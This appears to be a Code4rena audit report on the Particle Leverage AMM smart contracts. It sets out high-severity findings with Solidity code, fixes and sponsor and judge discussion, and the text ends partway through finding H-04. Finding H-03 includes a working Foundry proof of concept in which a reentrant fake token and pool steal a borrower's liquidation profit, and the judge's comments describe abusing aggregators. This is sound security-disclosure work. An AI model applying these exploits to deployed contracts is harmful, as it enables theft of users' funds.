---
sponsor: "Particle Protocol"
slug: "2023-12-particle"
date: "2024-01-26"
title: "Particle Leverage AMM Protocol Invitational"
findings: "https://github.com/code-423n4/2023-12-particle-findings/issues"
contest: 312
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Particle Leverage AMM Protocol smart contract system written in Solidity. The audit took place between December 11—December 21 2023.

## Wardens

In Code4rena's Invitational audits, the competition is limited to a small group of wardens; for this audit, 5 wardens contributed reports to Particle Leverage AMM Protocol:

  1. [bin2chen](https://code4rena.com/@bin2chen)
  2. [ladboy233](https://code4rena.com/@ladboy233)
  3. [said](https://code4rena.com/@said)
  4. [adriro](https://code4rena.com/@adriro)
  5. [immeas](https://code4rena.com/@immeas)

This audit was judged by [0xLeastwood](https://code4rena.com/@leastwood).

Final report assembled by PaperParachute.

# Summary

The C4 analysis yielded an aggregated total of 19 unique vulnerabilities. Of these vulnerabilities, 4 received a risk rating in the category of HIGH severity and 15 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 5 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 1 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Particle Leverage AMM Protocol repository](https://github.com/code-423n4/2023-12-particle), and is composed of 9 smart contracts written in the Solidity programming language and includes 1299 lines of Solidity code.

In addition to the known issues identified by the project team, an [Automated Findings report](https://github.com/code-423n4/2023-12-particle/blob/main/4naly3er-report.md) was generated using the [4naly3er bot](https://github.com/Picodes/4naly3er) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (4)
## [[H-01] If the borrower enters token blacklist, LP may never be able to retrieve Liquidity](https://github.com/code-423n4/2023-12-particle-findings/issues/31)
*Submitted by [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/31), also found by [ladboy233](https://github.com/code-423n4/2023-12-particle-findings/issues/16) and [said](https://github.com/code-423n4/2023-12-particle-findings/issues/6)*

Currently, there are two ways to retrieve `Liquidity`

1.  `borrower` actively close position :  call `closePosition()`
2.  be forced liquidation leads to close position :  `liquidatePosition()` ->  `_closePosition()`

No matter which one, if there is a profit in the end, it needs to be refunded to the `borrower`.

<details>

```solidity
    function _closePosition(
        DataStruct.ClosePositionParams calldata params,
        DataCache.ClosePositionCache memory cache,
        Lien.Info memory lien,
        address borrower
    ) internal {
..

       if (lien.zeroForOne) {
            cache.token0Owed = cache.token0Owed < cache.tokenToPremium ? cache.token0Owed : cache.tokenToPremium;
            cache.token1Owed = cache.token1Owed < cache.tokenFromPremium ? cache.token1Owed : cache.tokenFromPremium;
@>           Base.refundWithCheck(
                borrower,
                cache.tokenFrom,
                cache.collateralFrom + cache.tokenFromPremium,
                cache.amountSpent + cache.amountFromAdd + cache.token1Owed
            );
@>          Base.refundWithCheck(
                borrower,
                cache.tokenTo,
                cache.amountReceived + cache.tokenToPremium,
                cache.amountToAdd + cache.token0Owed
            );
        } else {
            cache.token0Owed = cache.token0Owed < cache.tokenFromPremium ? cache.token0Owed : cache.tokenFromPremium;
            cache.token1Owed = cache.token1Owed < cache.tokenToPremium ? cache.token1Owed : cache.tokenToPremium;
@>           Base.refundWithCheck(
                borrower,
                cache.tokenFrom,
                cache.collateralFrom + cache.tokenFromPremium,
                cache.amountSpent + cache.amountFromAdd + cache.token0Owed
            );
@>           Base.refundWithCheck(
                borrower,
                cache.tokenTo,
                cache.amountReceived + cache.tokenToPremium,
                cache.amountToAdd + cache.token1Owed
            );
        }


    function refund(address recipient, address token, uint256 amountExpected, uint256 amountActual) internal {
        if (amountExpected > amountActual) {
@>          TransferHelper.safeTransfer(token, recipient, amountExpected - amountActual);
        }
    }
```

</details>

In this way, if the `borrower` enters the token0 or token1 blacklist, such as `USDC` and the `token` always has a profit, then `refund() -> TransferHelper.safeTransfer()` will definitely `revert`, causing `_closePositon()` to always `revert`, and `LP`'s Liquidity is locked in the contract.

### Impact

If the `borrower` enters the `token` blacklist and always has  a profit, `LP` may not be able to retrieve `Liquidity`.

### Recommended Mitigation

Add a new `claims[token]` mechanism.<br>
If `refund()`-> `transfer()` fails, record `claims[token]+= (amountExpected - amountActual)`.<br>
And provide methods to support borrower to `claim()`.

**[wukong-particle (Particle) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/31#issuecomment-1868214672):**
 > Good suggestion, we will try something along this claims idea. Quick question, can't we simply add the `claim` amount into `tokenOwed` that's already there for LPs? 
> 
> Also, does it block all transfer method, or only `TransferHelper.safeTransfer`? We are open to use other transfer method if it makes things simpler.


**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/31#issuecomment-1868355987):**
 > Agree with this issue and it's severity. I would say all transfer methods would be blocked by the blacklist typically. I would also avoid allowing the recipient to be arbitrarily set, imo, the recipient here should always be the borrower. This avoids any issues in regards to the protocol facilitating users sidestepping blacklists.

**[wukong-particle (Particle) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/31#issuecomment-1868471065):**
 > Agree with the judge. We shouldn't and won't facilitate escaping the blacklist. Our current plan is to put the `claim` into `tokenOwed`, unless the wardens have other opinion to raise here.
>
 > Is the severity fair though? This only affect the trader that enters the blacklist, not a widespread fund stealing behavior, no?

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/31#issuecomment-1868487263):**
 > > Is the severity fair though? This only affect the trader that enters the blacklist, not a widespread fund stealing behavior, no?
> 
> Agreed, there is no widespread stealing of funds but unhealthy positions are at risk of not being liquidatable. It's possible LPs are left with bad debt right? Which is a core part of the protocol and should be prioritised above all else.

 > My understanding is still limited atm, but how can a position be liquidated when it is in profit? Is this state even possible in the first place? As far as I can see, liquidation only happens when token debt exceeds token premium or when the loan has "expired". I think there is possibility for refunds to happen in all three cases but it's unclear to me that a position is solvent in any case where a refund is sent out to the borrower. And on the other end, when a position is not solvent, LPs are still protected.

**[wukong-particle (Particle) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/31#issuecomment-1889799079):**
 > Forgot to follow up on this. Re judge's comment above, the bad state is e.g., when a loan has "expired" but still profitable. In this case, the LP will get their rightful amount back (the borrowed liquidity + interest), and whatever remains will be refunded to the borrower (could even be at a profit). (This is after solving the issue [26](https://github.com/code-423n4/2023-12-particle-findings/issues/26)).

However, after revising the contract, our team decides to skip this black issue for now for 2 reasons. 

(1) this should be a rare situation: a borrower was not in a blacklist, opens a position, then enters the blacklist before closing/liquidating the position. If this really happens once or twice, our protocol will have an insurance fund to repay the LP. If we observe it to be a frequently occurred issue, we will upgrade the contract with the suggested "try-catch-claim" pattern. 

(2) the liquidator can control the "amountSwap" to reduce the refund amount of blacklisted token to 0, only refunding the other token (basically skipping the swap for this token). This can't solve the problem if both tokens blacklist the borrower. 

So we will update the tag to sponsor-acknowledged. And we maintain that this shouldn't be a high severity issue since it should happen in very rare situation and 's not widespread. Thanks!
***

## [[H-02] openPosition() use stale feeGrowthInside0LastX128/feeGrowthInside1LastX128](https://github.com/code-423n4/2023-12-particle-findings/issues/28)
*Submitted by [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/28), also found by [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/50)*

When `openPosition()`, we need to record the current `feeGrowthInside0LastX128/feeGrowthInside1LastX128`.
And when closing the position, we use `Base.getOwedFee()` to calculate the possible fees generated during the borrowing period, which are used to pay the `LP`.

`openPosition()` -> `Base.prepareLeverage()`

```solidity
    function openPosition(
        DataStruct.OpenPositionParams calldata params
    ) public override nonReentrant returns (uint96 lienId, uint256 collateralTo) {
        if (params.liquidity == 0) revert Errors.InsufficientBorrow();

        // local cache to avoid stack too deep
        DataCache.OpenPositionCache memory cache;

        // prepare data for swap
        (
            cache.tokenFrom,
            cache.tokenTo,
            cache.feeGrowthInside0LastX128,
            cache.feeGrowthInside1LastX128,
            cache.collateralFrom,
            collateralTo
        ) = Base.prepareLeverage(params.tokenId, params.liquidity, params.zeroForOne);
...

        liens[keccak256(abi.encodePacked(msg.sender, lienId = _nextRecordId++))] = Lien.Info({
            tokenId: uint40(params.tokenId),
            liquidity: params.liquidity,
            token0PremiumPortion: cache.token0PremiumPortion,
            token1PremiumPortion: cache.token1PremiumPortion,
            startTime: uint32(block.timestamp),
@>          feeGrowthInside0LastX128: cache.feeGrowthInside0LastX128,
@>          feeGrowthInside1LastX128: cache.feeGrowthInside1LastX128,
            zeroForOne: params.zeroForOne
        });


    function prepareLeverage(
        uint256 tokenId,
        uint128 liquidity,
        bool zeroForOne
    )
        internal
        view
        returns (
            address tokenFrom,
            address tokenTo,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint256 collateralFrom,
            uint256 collateralTo
        )
    {
...
            ,
@>          feeGrowthInside0LastX128,
@>          feeGrowthInside1LastX128,
            ,

      ) = UNI_POSITION_MANAGER.positions(tokenId);

    }
```

From the above code, we can see that the final value saved to `liens[].feeGrowthInside0LastX128/feeGrowthInside1LastX128` is directly taken from `UNI_POSITION_MANAGER.positions(tokenId)`.

The problem is: The value in `UNI_POSITION_MANAGER.positions(tokenId)` is not the latest.

Only when executing `UNI_POSITION_MANAGER.increaseLiquidity()/decreaseLiquidity()/collect()` will it synchronize the `pool`'s `feeGrowthInside0LastX128/feeGrowthInside1LastX128`.

Because of using the stale value, it leads to a smaller value relative to the actual value. When `closePosition()`, the calculated difference will be larger, and the `borrower` will pay extra fees.

### Impact

Due to use stale `feeGrowthInside0LastX128/feeGrowthInside1LastX128`, the `borrower` will pay extra fees.

### Proof of Concept

The following test  code demonstrates that after `swap()`, `UNI_POSITION_MANAGER.positions(tokenId)` is not the latest unless actively executing `UNI_POSITION_MANAGER.collect()`.

Add to `Swap.t.sol`:

```solidity
    function testShowCache() public {
        (,,,,,,,,uint256 feeGrowthInside0LastX128,uint256 feeGrowthInside1LastX128,,) = nonfungiblePositionManager.positions(_tokenId);
        console.log("feeGrowthInside0LastX128(first):",feeGrowthInside0LastX128);
        console.log("feeGrowthInside1LastX128(first):",feeGrowthInside1LastX128);         
        _swap();
        (,,,,,,,,uint256 feeGrowthInside0LastX128Swap,uint feeGrowthInside1LastX128Swap,,) = nonfungiblePositionManager.positions(_tokenId);
        console.log("equal 0 (after swap):",feeGrowthInside0LastX128Swap == feeGrowthInside0LastX128);
        console.log("equal 1 (after swap):",feeGrowthInside1LastX128Swap == feeGrowthInside1LastX128);
        vm.startPrank(LP);
        particlePositionManager.collectLiquidity(_tokenId);
        vm.stopPrank();          
        (,,,,,,,,uint256 feeGrowthInside0LastX128After,uint256 feeGrowthInside1LastX128After,,) = nonfungiblePositionManager.positions(_tokenId);
        console.log("feeGrowthInside0LastX128(after collect):",feeGrowthInside0LastX128After);
        console.log("feeGrowthInside1LastX128(after collect):",feeGrowthInside1LastX128After); 
        
        console.log("feeGrowthInside0LastX128(more):",feeGrowthInside0LastX128After - feeGrowthInside0LastX128);
        console.log("feeGrowthInside1LastX128(more):",feeGrowthInside1LastX128After - feeGrowthInside1LastX128);
    }
```

```console
forge test -vvv --match-test testShowCache --fork-url https://eth-mainnet.g.alchemy.com/v2/xxxxx --fork-block-number 18750931

Logs:
  feeGrowthInside0LastX128(first): 72311088602808532523286912166257
  feeGrowthInside1LastX128(first): 29354860053667370145800991738605288969228
  equal 0 (after swap): true
  equal 1 (after swap): true
  feeGrowthInside0LastX128(after collect): 72311299261479720625185125361673
  feeGrowthInside1LastX128(after collect): 29354860053667370145800991738605288969228
  feeGrowthInside0LastX128(more): 210658671188101898213195416
  feeGrowthInside1LastX128(more): 0
```

### Recommended Mitigation

After `LiquidityPosition.collectLiquidity()`, execute `Base.prepareLeverage()` to ensure the latest `feeGrowthInside0LastX128/feeGrowthInside1LastX128`.

```diff
    function openPosition(
        DataStruct.OpenPositionParams calldata params
    ) public override nonReentrant returns (uint96 lienId, uint256 collateralTo) {
    function openPosition(
        DataStruct.OpenPositionParams calldata params
    ) public override nonReentrant returns (uint96 lienId, uint256 collateralTo) {
        if (params.liquidity == 0) revert Errors.InsufficientBorrow();

        // local cache to avoid stack too deep
        DataCache.OpenPositionCache memory cache;

-       // prepare data for swap
-       (
-           cache.tokenFrom,
-            cache.tokenTo,
-            cache.feeGrowthInside0LastX128,
-            cache.feeGrowthInside1LastX128,
-            cache.collateralFrom,
-            collateralTo
-        ) = Base.prepareLeverage(params.tokenId, params.liquidity, params.zeroForOne);

        // decrease liquidity from LP position, pull the amount to this contract
        (cache.amountFromBorrowed, cache.amountToBorrowed) = LiquidityPosition.decreaseLiquidity(
            params.tokenId,
            params.liquidity
        );
        LiquidityPosition.collectLiquidity(
            params.tokenId,
            uint128(cache.amountFromBorrowed),
            uint128(cache.amountToBorrowed),
            address(this)
        );
+       // prepare data for swap
+        (
+            cache.tokenFrom,
+            cache.tokenTo,
+            cache.feeGrowthInside0LastX128,
+            cache.feeGrowthInside1LastX128,
+            cache.collateralFrom,
+            collateralTo
+        ) = Base.prepareLeverage(params.tokenId, params.liquidity, params.zeroForOne);

```

**[wukong-particle (Particle) confirmed](https://github.com/code-423n4/2023-12-particle-findings/issues/28#issuecomment-1868470557)**

***

## [[H-03] liquidatePosition() liquidator can construct malicious data to steal the borrower's profit](https://github.com/code-423n4/2023-12-particle-findings/issues/26)
*Submitted by [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/26), also found by [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/56), ladboy233 ([1](https://github.com/code-423n4/2023-12-particle-findings/issues/21), [2](https://github.com/code-423n4/2023-12-particle-findings/issues/20)), and [immeas](https://github.com/code-423n4/2023-12-particle-findings/issues/48)*

When the Loan expires, and `RenewalCutoffTime` has been set, anyone can execute the liquidation method `liquidatePosition()`.<br>
Execution path: `liquidatePosition()` -> `_closePosition()` -> `Base.swap(params.data)`

The problem is that this `params.data` can be arbitrarily constructed by the liquidator.
As long as there is enough `amountReceived` after the exchange for repayment, it will not `revert`.

In this way, you can maliciously construct `data` and steal the extra profit of the liquidator. (At least `amountReceived` must be guaranteed)

Assume:

collateral + tokenPremium = 120<br>
repay minimum `amountReceived` only need 100 to swap<br>
so borrower Profit 120 - 100 = 20

1.  create fakeErc20 and fakePool (token0 = fakeErc20,token1 = WETH)
2.  execute liquidatePosition():pool = fakePool , swapAmount = 120   (all collateral + tokenPremium)
3.  in fakeErc20.transfer() reentry execute reply 100 equivalent `amountReceived` (transfer to ParticlePositionManager)
4.  liquidatePosition() success , steal 120 - 100 = 20

### Proof of Concept

Add to `LiquidationTest.t.sol`:

<details>

```solidity
contract FakeErc20 is ERC20 {
    bool public startTransfer = false;
    address public transferTo;
    uint256 public transferAmount;
    constructor() ERC20("","") {
    }    
    function set(bool _startTransfer,address _transferTo,uint256 _transferAmount) external {
        startTransfer = _startTransfer;
        transferTo = _transferTo;
        transferAmount = _transferAmount;
    }
    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        //for pay loan , usdc
        if(startTransfer) ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).transfer(transferTo,transferAmount);
        return true;
    }    
}


    FakeErc20 public fakeErc20 = new FakeErc20();
    function uniswapV3MintCallback(
        uint256 amount0Owed,
        uint256 amount1Owed,
        bytes calldata
    ) external {
        ERC20 token0 = address(fakeErc20) < address(WETH) ? ERC20(fakeErc20):ERC20(address(WETH));
        ERC20 token1 = address(fakeErc20) < address(WETH) ? ERC20(address(WETH)):ERC20(fakeErc20);
        if (amount0Owed > 0) token0.transfer(msg.sender,amount0Owed);
        if (amount1Owed > 0) token1.transfer(msg.sender,amount1Owed);
        
    }    
    function testStealProfit() public {
        //1. open Position
        _openLongPosition();
        _addPremium(PREMIUM_0, PREMIUM_1);
        vm.warp(block.timestamp + 1 seconds);
        _renewalCutoff();
        vm.warp(block.timestamp + 7 days);

        //2. init fake pool
        address anyone = address(0x123990088); 
        uint256 fakePoolGetETH;
        uint256 payUsdcToLp;
        uint256 amountToAdd;
        bytes memory data;
        vm.startPrank(WHALE);
        WETH.transfer(address(this), 1000e18);
        fakeErc20.mint(address(this), 1000e18);
        vm.stopPrank();
        IUniswapV3Pool fakePool = IUniswapV3Pool(uniswapV3Factory.createPool(address(WETH), address(fakeErc20), FEE));
        fakePool.initialize(TickMath.getSqrtRatioAtTick((_tickLower + _tickUpper) / 2 ));
        fakePool.mint(address(this), _tickLower, _tickUpper, 1e18, "");

        //3. compute swap amount
        {
            (,uint128 token1Owed,,uint128 token1Premium,,uint256 collateral1) = particleInfoReader.getOwedInfo(SWAPPER, LIEN_ID);
            (uint40 tokenId, uint128 liquidity, , , , , , ) = particleInfoReader.getLien(SWAPPER, LIEN_ID);
            (payUsdcToLp, amountToAdd) = Base.getRequiredRepay(liquidity, tokenId);

            uint256 amountSwap = collateral1 + token1Premium - amountToAdd - token1Owed - (token1Premium * LIQUIDATION_REWARD_FACTOR /BASIS_POINT);
            
        
            ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
                tokenIn: address(WETH),
                tokenOut: address(fakeErc20),
                fee: FEE,
                recipient: anyone,
                deadline: block.timestamp,
                amountIn: amountSwap,
                amountOutMinimum: 0,
                sqrtPriceLimitX96:0
            });
            data = abi.encodeWithSelector(ISwapRouter.exactInputSingle.selector, params);
            //4. execute liquidatePosition pay usdc and get eth
            vm.startPrank(WHALE);
            USDC.transfer(address(fakeErc20), payUsdcToLp);
            fakeErc20.set(true,address(particlePositionManager),payUsdcToLp);
            vm.stopPrank();     
            uint256 fakePoolEthBalance = WETH.balanceOf(address(fakePool));
            vm.startPrank(anyone);
            particlePositionManager.liquidatePosition(
                DataStruct.ClosePositionParams({lienId: uint96(LIEN_ID), amountSwap: amountSwap, data: data}),
                SWAPPER
            );
            vm.stopPrank(); 
            fakePoolGetETH = WETH.balanceOf(address(fakePool)) -  fakePoolEthBalance;                
        }
   
        //5. show steal usdc
        console.log("steal eth :",fakePoolGetETH);  
        console.log("pay usdc:",payUsdcToLp / 1e6);  
        uint256 usdcBefore = USDC.balanceOf(address(fakePool));
        _swap(address(fakePool),address(WETH),address(USDC),FEE,fakePoolGetETH); //Simplify: In reality can use fakeErc20 swap eth
        console.log("steal eth swap to usdc:",(USDC.balanceOf(address(fakePool)) - usdcBefore) / 1e6);  
        console.log("steal usdc:",(USDC.balanceOf(address(fakePool)) - usdcBefore - payUsdcToLp)/1e6);  
    }

```

</details>

```console
forge test -vvv --match-test testStealProfit --fork-url https://eth-mainnet.g.alchemy.com/v2/xxx --fork-block-number 18750931


Logs:
  steal eth : 790605367691135637
  pay usdc: 737
  steal eth swap to usdc: 1856
  steal usdc: 1118

```

### Impact

Liquidator can construct malicious data to steal the borrower's profit.

### Recommended Mitigation

It is recommended to remove `data`.<br>
The protocol already knows the `token0/token1` and `params.amountSwap` that need to be exchanged, which is enough to construct the elements needed for swap.

**[wukong-particle (Particle) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1868213971):**
 > This is a great finding around our arbitrary swap data. The reason we have it is that we wanted to use 1inch to route for the best price when swapping.
> 
> In your recommendation
> 
> > It is recommended to remove data.<br>
> > The protocol already knows the token0/token1 and params.amountSwap that need to be exchanged, which is enough to construct the elements needed for swap.
> 
> That means we use the `swapExactInput` inside our `Base.swap` to replace `data`, right?
> 
> -- 
> 
> Want to discuss more here though, is this attack applicable to *any* ERC20 tokens? This step:
> 
> > in fakeErc20.transfer() reentry execute reply 100 equivalent amountReceived (transfer to ParticlePositionManager)
> 
> can't be generally triggered for normal ERC20, right? There isn't a callback when receiving ERC20 (unlike ERC721 on receive callback)?
> 
> How often does a normal ERC20 have a customized callback to allow reentrancy like the `FakeErc20` in example? Thanks!

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1868356149):**
 > Agree with this finding and it's severity.

**[wukong-particle (Particle) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1868470391):**
 > Acknowledging the issue as it indeed can happen if a malicious erc20 is designed for our protocol. But unlikely to patch completely because otherwise we wouldn't be use 1inch or other general router.
> 
> We disagree with the severity though, because this attack, at its current design, can't apply to all ERC20 in general. Wardens please do raise concern if our understanding is incorrect here. Thanks!

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1868488851):**
 > So to clarify, for this attack to be possible, the protocol would need to have a pool containing a malicious erc20 token and have significant liquidity in this pool? @wukong-particle 
>
 > Can this attack not also be possible with any token with callbacks enabled?
>
 > Also, regardless of a malicious erc20 token, we could still extract significant value by sandwiching attacking the swap no?
> 
> Consider the following snippet of code:
> ```solidity
> function swap(
>     IAggregationExecutor caller,
>     SwapDescription calldata desc,
>     bytes calldata data
> )
>     external
>     payable
>     returns (uint256 returnAmount, uint256 gasLeft)
> {
>     require(desc.minReturnAmount > 0, "Min return should not be 0");
>     require(data.length > 0, "data should not be empty");
> 
>     uint256 flags = desc.flags;
>     IERC20 srcToken = desc.srcToken;
>     IERC20 dstToken = desc.dstToken;
> 
>     bool srcETH = srcToken.isETH();
>     if (flags & _REQUIRES_EXTRA_ETH != 0) {
>         require(msg.value > (srcETH ? desc.amount : 0), "Invalid msg.value");
>     } else {
>         require(msg.value == (srcETH ? desc.amount : 0), "Invalid msg.value");
>     }
> 
>     if (!srcETH) {
>         _permit(address(srcToken), desc.permit);
>         srcToken.safeTransferFrom(msg.sender, desc.srcReceiver, desc.amount);
>     }
> 
>     {
>         bytes memory callData = abi.encodePacked(caller.callBytes.selector, bytes12(0), msg.sender, data);
>         // solhint-disable-next-line avoid-low-level-calls
>         (bool success, bytes memory result) = address(caller).call{value: msg.value}(callData);
>         if (!success) {
>             revert(RevertReasonParser.parse(result, "callBytes failed: "));
>         }
>     }
> 
>     uint256 spentAmount = desc.amount;
>     returnAmount = dstToken.uniBalanceOf(address(this));
> 
>     if (flags & _PARTIAL_FILL != 0) {
>         uint256 unspentAmount = srcToken.uniBalanceOf(address(this));
>         if (unspentAmount > 0) {
>             spentAmount = spentAmount.sub(unspentAmount);
>             srcToken.uniTransfer(msg.sender, unspentAmount);
>         }
>         require(returnAmount.mul(desc.amount) >= desc.minReturnAmount.mul(spentAmount), "Return amount is not enough");
>     } else {
>         require(returnAmount >= desc.minReturnAmount, "Return amount is not enough");
>     }
> 
>     address payable dstReceiver = (desc.dstReceiver == address(0)) ? msg.sender : desc.dstReceiver;
>     dstToken.uniTransfer(dstReceiver, returnAmount);
> 
>     emit Swapped(
>         msg.sender,
>         srcToken,
>         dstToken,
>         dstReceiver,
>         spentAmount,
>         returnAmount
>     );
> 
>     gasLeft = gasleft();
> }
> ```
> The router has been approved as a spender and can therefore transfer `desc.amount` to `desc.srcReceiver`. Subsequently, an external call is made `caller` which is also controlled by the liquidator. Here, they would simply have to perform the swap themselves and transfer the expected amount back to the contract. Keeping any excess. This is an issue for `AggregationRouterV4` and I would expect there are similar types of issues in other DEX aggregator contracts.
>
 > `AggregationRouterV5` is also vulnerable to the same issue.
> 
> ```solidity
> function swap(
>     IAggregationExecutor executor,
>     SwapDescription calldata desc,
>     bytes calldata permit,
>     bytes calldata data
> )
>     external
>     payable
>     returns (
>         uint256 returnAmount,
>         uint256 spentAmount
>     )
> {
>     if (desc.minReturnAmount == 0) revert ZeroMinReturn();
> 
>     IERC20 srcToken = desc.srcToken;
>     IERC20 dstToken = desc.dstToken;
> 
>     bool srcETH = srcToken.isETH();
>     if (desc.flags & _REQUIRES_EXTRA_ETH != 0) {
>         if (msg.value <= (srcETH ? desc.amount : 0)) revert RouterErrors.InvalidMsgValue();
>     } else {
>         if (msg.value != (srcETH ? desc.amount : 0)) revert RouterErrors.InvalidMsgValue();
>     }
> 
>     if (!srcETH) {
>         if (permit.length > 0) {
>             srcToken.safePermit(permit);
>         }
>         srcToken.safeTransferFrom(msg.sender, desc.srcReceiver, desc.amount);
>     }
> 
>     _execute(executor, msg.sender, desc.amount, data);
> 
>     spentAmount = desc.amount;
>     // we leave 1 wei on the router for gas optimisations reasons
>     returnAmount = dstToken.uniBalanceOf(address(this));
>     if (returnAmount == 0) revert ZeroReturnAmount();
>     unchecked { returnAmount--; }
> 
>     if (desc.flags & _PARTIAL_FILL != 0) {
>         uint256 unspentAmount = srcToken.uniBalanceOf(address(this));
>         if (unspentAmount > 1) {
>             // we leave 1 wei on the router for gas optimisations reasons
>             unchecked { unspentAmount--; }
>             spentAmount -= unspentAmount;
>             srcToken.uniTransfer(payable(msg.sender), unspentAmount);
>         }
>         if (returnAmount * desc.amount < desc.minReturnAmount * spentAmount) revert RouterErrors.ReturnAmountIsNotEnough();
>     } else {
>         if (returnAmount < desc.minReturnAmount) revert RouterErrors.ReturnAmountIsNotEnough();
>     }
> 
>     address payable dstReceiver = (desc.dstReceiver == address(0)) ? payable(msg.sender) : desc.dstReceiver;
>     dstToken.uniTransfer(dstReceiver, returnAmount);
> }
> ```
 > As such, I think this is vulnerable to all erc20 tokens.

**[wukong-particle (Particle) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1869182189):**
 > Hmm ok I see, this is more like a malicious pool attack rather than malicious erc20 token attack. It's using the vulnerability from swap aggregator (e.g. the arbitrary call of `address(caller).call{value: msg.value}(callData);` in `AggregationRouterV5`.
> 
> To fix this, we can restrict the `DEX_AGGREGATOR` to be Uniswap's `SwapRouter` (deployed at 0xE592427A0AEce92De3Edee1F18E0157C05861564 on mainnet). This router interacts with Uniswap only (it has multicall, so we can use `data` to choose multi-path if needed). 
> 
> Will this resolve this vulnerability? @0xleastwood @adriro @bin2chen 

**[bin2chen (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1869320390):**
 > @wukong-particle I’m sorry, I didn’t quite understand what you mean. In the POC, it use Uniswap’s SwapRouter and Pool.
> 
> In my personal understanding, if the liquidator still passes in `data`, then we need to check the security of this data, but it’s quite difficult to check.
> So I still keep my opinion, `liquidatePosition()` ignores the incoming `data`, and the method constructs data internally, which is how to determine the swap slippage is a problem.


**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1869346691):**
 > Ok understood, based on the PoC provided here and the 1inch v5 vulnerability raised by the judge, I think we should remove the raw data from input parameters altogether. We will use direct swap (with the fee as input to select which pool to execute the swap). Thanks for the discussion! 

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1869398044):**
 > So Uniswap's `SwapRouter` contract is vulnerable to something slightly different. We can control the path at which tokens are swapped, stealing any profit along the way. Additionally, all DEX aggregators would be prone to sandwich attacks. 
> 
> I think there can be some better input validation when it comes to performing the actual swap. If possible we should try to avoid any swaps during liquidation as this leaves the protocol open to potential bad debt accrual and issues with slippage control. Validating slippage impacts the liveness of liquidations so that is also not an ideal solution. It really depends on what should be prioritised here?

***

## [[H-04] Underflow could happened when calculating Uniswap V3 position's fee growth and can cause operations to revert](https://github.com/code-423n4/2023-12-particle-findings/issues/10)
*Submitted by [said](https://github.com/code-423n4/2023-12-particle-findings/issues/10)*

When operations need to calculate Uniswap V3 position's fee growth, it used similar function implemented by [uniswap v3](https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/PositionValue.sol#L145-L166). However, according to this known issue : <https://github.com/Uniswap/v3-core/issues/573>.  The contract is implicitly relies on underflow/overflow when calculating the fee growth, if underflow is prevented, some operations that rely on fee growth will revert.

### Proof of Concept

It can be observed that current implementation of  `getFeeGrowthInside` not allow underflow/overflow to happen when calculating `feeGrowthInside0X128` and `feeGrowthInside1X128`, because the contract used solidity 0.8.23.

<https://github.com/code-423n4/2023-12-particle/blob/main/contracts/libraries/Base.sol#L318-L342>

<details>

```solidity
    function getFeeGrowthInside(
        address token0,
        address token1,
        uint24 fee,
        int24 tickLower,
        int24 tickUpper
    ) internal view returns (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) {
        IUniswapV3Pool pool = IUniswapV3Pool(UNI_FACTORY.getPool(token0, token1, fee));
        (, int24 tickCurrent, , , , , ) = pool.slot0();
        (, , uint256 lowerFeeGrowthOutside0X128, uint256 lowerFeeGrowthOutside1X128, , , , ) = pool.ticks(tickLower);
        (, , uint256 upperFeeGrowthOutside0X128, uint256 upperFeeGrowthOutside1X128, , , , ) = pool.ticks(tickUpper);

        if (tickCurrent < tickLower) {
            feeGrowthInside0X128 = lowerFeeGrowthOutside0X128 - upperFeeGrowthOutside0X128;
            feeGrowthInside1X128 = lowerFeeGrowthOutside1X128 - upperFeeGrowthOutside1X128;
        } else if (tickCurrent < tickUpper) {
            uint256 feeGrowthGlobal0X128 = pool.feeGrowthGlobal0X128();
            uint256 feeGrowthGlobal1X128 = pool.feeGrowthGlobal1X128();
            feeGrowthInside0X128 = feeGrowthGlobal0X128 - lowerFeeGrowthOutside0X128 - upperFeeGrowthOutside0X128;
